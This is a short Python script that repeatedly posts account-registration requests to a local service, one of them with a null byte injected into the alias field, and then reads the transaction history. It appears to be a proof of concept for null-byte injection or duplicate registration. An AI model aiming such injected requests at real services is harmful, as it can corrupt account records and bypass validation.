import requests

request_data_post = '{"publicKey":"WdvM/DPabapmtA7ISbTYPywbHxk8gWu2221LzmcmAgw=","alias":"yonezu","timestamp":1482053586}'
list_request = list(request_data_post)
list_request[69] = '\0'
mod_request = "".join(list_request)
address = "http://127.0.0.1:1204/account/register"

while True:
    r1 = requests.post(address, data=request_data_post)
    r2 = requests.post(address, data=mod_request)
    r3 = requests.post(address, data=request_data_post)
    gr = requests.get("http://127.0.0.1:1204/history/transaction")
